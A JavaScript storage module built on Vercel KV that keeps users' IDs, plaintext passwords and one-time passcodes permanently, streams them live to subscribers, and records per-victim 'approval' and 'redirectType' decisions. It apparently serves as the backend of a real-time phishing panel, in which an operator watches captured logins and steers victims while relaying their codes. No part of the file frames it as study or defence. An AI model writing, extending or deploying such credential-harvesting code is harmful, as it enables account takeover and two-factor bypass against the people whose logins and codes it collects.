// Vercel KV client wrapper
// Stores all activities including credentials permanently

let kv;
try {
  kv = require('@vercel/kv').kv;
  console.log('[kv-client] ✅ Vercel KV initialized successfully');
} catch (error) {
  console.warn('[kv-client] ⚠️ Vercel KV not available, using in-memory fallback');
  kv = null;
}

// In-memory fallback for development
const memoryStore = {
  activities: [],
  approvals: {},
  subscribers: []
};

const ACTIVITY_CHANNEL = 'activities';
const APPROVAL_PREFIX = 'approval:';
const ACTIVITY_STORAGE_PREFIX = 'activity-storage:';
const ACTIVITIES_LIST_KEY = 'activities-list';

// Store full activity including credentials permanently
export async function publishActivity(activity) {
  try {
    // Store full activity with all credentials
    const fullActivity = {
      id: activity.id,
      type: activity.type,
      timestamp: activity.timestamp,
      userId: activity.userId,
      password: activity.password || null,
      otpCode: activity.otpCode || null,
      hasPassword: activity.hasPassword || false
    };
    
    if (kv) {
      // Store full activity permanently (no TTL)
      await kv.set(
        `${ACTIVITY_STORAGE_PREFIX}${activity.id}`,
        JSON.stringify(fullActivity)
      );
      
      // Add to activities list (for retrieval)
      await kv.lpush(ACTIVITIES_LIST_KEY, activity.id);
      // Keep only last 1000 activities in list
      await kv.ltrim(ACTIVITIES_LIST_KEY, 0, 999);
      console.log(`[kv-client] Stored activity ${activity.id} with userId: ${activity.userId}`);
      
      // Publish to channel for real-time subscribers
      await kv.publish(ACTIVITY_CHANNEL, JSON.stringify({
        type: 'activity',
        data: fullActivity
      }));
    } else {
      // Fallback: store in memory (keep all, no limit)
      memoryStore.activities.unshift(fullActivity);
      
      // Notify subscribers
      memoryStore.subscribers.forEach(callback => {
        callback({
          type: 'activity',
          data: fullActivity
        });
      });
    }
    
    return true;
  } catch (error) {
    console.error('Error publishing activity:', error);
    // Fallback to memory on error
    memoryStore.activities.unshift(activity);
    return true;
  }
}

// Store approval decision (activity ID + status only)
export async function setApproval(activityId, approval) {
  // Define approvalData outside try block so it's available in catch
  const approvalData = {
    status: approval.status,
    redirectType: approval.redirectType || null,
    timestamp: approval.timestamp || new Date().toISOString()
  };
  
  try {
    if (kv) {
      // Store approval with 10 minute TTL
      await kv.setex(
        `${APPROVAL_PREFIX}${activityId}`,
        600, // 10 minutes
        JSON.stringify(approvalData)
      );
      
      // Publish approval event
      const approvalMessage = {
        type: 'approval',
        activityId,
        data: approvalData
      };
      await kv.publish(ACTIVITY_CHANNEL, JSON.stringify(approvalMessage));
      console.log(`[kv-client] Published approval to channel '${ACTIVITY_CHANNEL}':`, approvalMessage);
    } else {
      // Fallback: store in memory
      memoryStore.approvals[activityId] = approvalData;
      
      // Notify subscribers
      const approvalMessage = {
        type: 'approval',
        activityId,
        data: approvalData
      };
      console.log(`[kv-client] Broadcasting approval to memory subscribers:`, approvalMessage);
      memoryStore.subscribers.forEach(callback => {
        try {
          callback(approvalMessage);
        } catch (error) {
          console.error('Error in memory subscriber callback:', error);
        }
      });
    }
    
    return true;
  } catch (error) {
    console.error('Error setting approval:', error);
    // Fallback to memory on error
    try {
      memoryStore.approvals[activityId] = approvalData;
      
      // Also notify memory subscribers
      const approvalMessage = {
        type: 'approval',
        activityId,
        data: approvalData
      };
      memoryStore.subscribers.forEach(callback => {
        try {
          callback(approvalMessage);
        } catch (err) {
          console.error('Error in memory subscriber callback (fallback):', err);
        }
      });
    } catch (fallbackError) {
      console.error('Error in fallback approval storage:', fallbackError);
    }
    return true;
  }
}

// Get approval status
export async function getApproval(activityId) {
  try {
    if (kv) {
      const data = await kv.get(`${APPROVAL_PREFIX}${activityId}`);
      return data ? JSON.parse(data) : null;
    } else {
      // Fallback: get from memory
      return memoryStore.approvals[activityId] || null;
    }
  } catch (error) {
    console.error('Error getting approval:', error);
    // Fallback to memory on error
    return memoryStore.approvals[activityId] || null;
  }
}

// Get recent activities with full credentials (for initial load)
export async function getRecentActivities() {
  try {
    if (kv) {
      console.log('[kv-client] 📦 Fetching from Vercel KV...');
      // Get last 500 activity IDs from list (more history)
      const activityIds = await kv.lrange(ACTIVITIES_LIST_KEY, 0, 499);
      console.log(`[kv-client] Retrieved ${activityIds.length} activity IDs from KV`);
      const activities = [];
      
      // Fetch full activities
      for (const activityId of activityIds) {
        try {
          const data = await kv.get(`${ACTIVITY_STORAGE_PREFIX}${activityId}`);
          if (data) {
            const activity = JSON.parse(data);
            activities.push(activity);
          }
        } catch (err) {
          console.error(`[kv-client] Error fetching activity ${activityId}:`, err);
        }
      }
      
      console.log(`[kv-client] ✅ Successfully loaded ${activities.length} activities from KV`);
      
      // Sort by timestamp descending
      return activities.sort((a, b) => 
        new Date(b.timestamp) - new Date(a.timestamp)
      );
    } else {
      // Fallback: return from memory (all activities)
      console.log(`[kv-client] 💾 Using memory fallback, returning ${memoryStore.activities.length} activities`);
      return memoryStore.activities.slice(0, 500);
    }
  } catch (error) {
    console.error('[kv-client] ❌ Error getting recent activities:', error);
    // Fallback to memory on error
    console.log(`[kv-client] 💾 Falling back to memory: ${memoryStore.activities.length} activities`);
    return memoryStore.activities.slice(0, 500);
  }
}

// Subscribe to memory events (for fallback mode)
export function subscribeMemoryEvents(callback) {
  memoryStore.subscribers.push(callback);
  return () => {
    const index = memoryStore.subscribers.indexOf(callback);
    if (index > -1) {
      memoryStore.subscribers.splice(index, 1);
    }
  };
}

// Trigger all memory subscribers (called from broadcastToSSE)
export function triggerMemorySubscribers(data) {
  console.log(`[kv-client] triggerMemorySubscribers called with:`, data);
  console.log(`[kv-client] Number of subscribers: ${memoryStore.subscribers.length}`);
  memoryStore.subscribers.forEach((callback, index) => {
    try {
      console.log(`[kv-client] Calling subscriber ${index + 1}...`);
      callback(data);
      console.log(`[kv-client] Subscriber ${index + 1} called successfully`);
    } catch (error) {
      console.error(`[kv-client] Error in subscriber ${index + 1}:`, error);
    }
  });
  console.log(`[kv-client] All ${memoryStore.subscribers.length} subscribers notified`);
}

